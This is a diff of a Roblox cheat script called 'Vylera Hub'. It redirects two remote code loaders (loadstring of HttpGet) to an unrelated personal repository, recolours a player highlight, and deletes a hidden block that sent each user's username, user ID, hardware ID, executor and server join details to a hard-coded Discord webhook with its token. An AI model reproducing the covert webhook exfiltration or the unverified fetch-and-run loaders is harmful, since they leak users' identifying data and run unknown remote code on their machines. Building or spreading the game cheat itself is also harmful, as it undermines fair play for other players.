@@ -21,7 +21,7 @@ else
     warn("Your exploit does not support setfpscap.")
 end
 
-local WindUI = (loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua")))();
+local WindUI = (loadstring(game:HttpGet("https://raw.githubusercontent.com/hoangthangvuong50-alt/Test/refs/heads/main/new.txt")))();
 local Window = WindUI:CreateWindow({
     Title = "Vylera Hub",
     Icon = "rbxassetid://84228153855933",
@@ -2156,7 +2156,7 @@ spawn(function()
     end);
 end);
 loadstring(
-    game:HttpGet("https://raw.githubusercontent.com/AnhTuanDzai-Hub/FastAttackLoL/refs/heads/main/FastAttack.lua"))()
+    game:HttpGet("https://raw.githubusercontent.com/hoangthangvuong50-alt/Test/refs/heads/main/nhanh.txt"))()
 function EquipWeaponSword()
     pcall(function()
         for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
@@ -10567,10 +10567,10 @@ HighlightFolder.Parent = game.CoreGui
 local function HighlightSelf(player)
     local highlight = Instance.new("Highlight")
     highlight.Name = player.Name
-    highlight.FillColor = Color3.fromRGB(255, 255, 255)
+    highlight.FillColor = Color3.fromRGB(170, 0, 255)
     highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
     highlight.FillTransparency = 0.7
-    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+    highlight.OutlineColor = Color3.fromRGB(170, 0, 255)
     highlight.Parent = HighlightFolder
 
     if player.Character then
@@ -10592,80 +10592,8 @@ end)
 InputService.WindowFocusReleased:Connect(function()
     RunService:Set3dRenderingEnabled(false)
 end)
-local Players = game:GetService("Players")
-local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
 
-local player = Players.LocalPlayer
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local executor = identifyexecutor()
-local placeId = game.PlaceId
-local jobId = game.JobId
 
--- Tạo dữ liệu gửi lên Discord
-local Data = {
-    ["embeds"] = {{
-        ["title"] = "Roblox Account Information",
-        ["url"] = "https://www.roblox.com/users/" .. player.UserId,
-        ["description"] = "Display name: **" .. player.DisplayName .. "**",
-        ["color"] = tonumber("0x000000"), -- Đổi màu viền thành đen
-        ["thumbnail"] = {
-            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId ..
-                "&width=420&height=420&format=png"
-        },
-        ["fields"] = {{
-            ["name"] = "Username:",
-            ["value"] = "`" .. player.Name .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "User ID:",
-            ["value"] = "`" .. player.UserId .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "Executor:",
-            ["value"] = "`" .. executor .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "HWID:",
-            ["value"] = "`" .. hwid .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "Place ID:",
-            ["value"] = "`" .. placeId .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "Job ID:",
-            ["value"] = "`" .. jobId .. "`",
-            ["inline"] = true
-        }, {
-            ["name"] = "Script Hop:",
-            ["value"] = "```lua\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" ..
-                jobId .. "\", game.Players.LocalPlayer)```",
-            ["inline"] = false
-        }, {
-            ["name"] = "Thank You Everyone",
-            ["value"] = "Used Script By Vylera Hub",
-            ["inline"] = false
-        }}
-    }}
-}
-
-local Headers = {
-    ["Content-Type"] = "application/json"
-}
-local Encoded = HttpService:JSONEncode(Data)
-
-local WebhookURL =
-    "https://discord.com/api/webhooks/1361944409662423180/cliAsM5X1dqSTEBoz_yO5gsirtWfm7dNAAE89mnHbiu0Lww2-ISxYaWWBLsXexauGM6-"
-local Request = http_request or request or HttpPost or syn.request
-if Request then
-    Request({
-        Url = WebhookURL,
-        Body = Encoded,
-        Method = "POST",
-        Headers = Headers
-    })
-end
 _G.FastAttack = true
 
 if _G.FastAttack then
